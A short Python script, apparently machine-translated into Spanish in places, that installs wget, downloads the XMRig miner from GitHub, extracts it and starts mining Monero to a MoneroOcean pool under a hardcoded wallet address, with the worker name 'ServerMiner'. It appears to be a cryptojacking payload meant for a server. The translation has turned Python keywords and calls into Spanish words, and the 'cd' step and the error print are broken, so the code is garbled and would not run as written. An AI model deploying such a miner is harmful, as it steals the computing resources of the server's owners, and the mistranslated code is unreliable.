subproceso de importación

intentar:

	subprocess.run(["apt", "install", "wget"])

	subprocess.run(["wget", "https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-x64.tar.gz"])

	subproceso.ejecutar(["apt", "instalar", "tar"])

	subproceso.ejecutar(["tar","xf","xmrig-6.16.4-linux-x64.tar.gz"])

	subproceso.ejecutar(["cd","xmrig-6.16.4/"])

	subprocess.run(["./xmrig","-o","gulf.moneroocean.stream:10128","-a","randomx","-u","42iamd1fenv4CiTk5QgbD2YJUDxJHwmTxRj7V8p6oProaffUC7TkJDPLUAxRjTrsd3RfjzWNvEEHyL4Ud3NSJKqvHhpjdND","- p"," ServerMiner"])

excepto subprocess.CalledProcessError como err:

	print("ERROR:" + err)
